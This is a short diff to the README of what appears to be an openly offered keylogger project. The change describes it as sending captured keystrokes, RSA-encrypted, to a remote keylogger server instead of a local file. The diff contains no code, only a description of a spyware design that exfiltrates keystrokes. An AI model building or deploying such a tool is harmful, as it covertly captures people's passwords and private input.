@@ -6,10 +6,11 @@
 
 For Educational Purposes Only
 
-Logs keyboard events to /tmp/keylog.txt
+Logs keyboard events as RSA2048 with pkcs1v15 padding scheme to [rust-keylogger-server](https://github.com/mrteathyme/rust-keylogger-server) instance.
 
 ## Highlighted Features
 - Its a keylogger, it logs keys.
+- E2E encryption because we just do that here.
 
 ## Contact
 
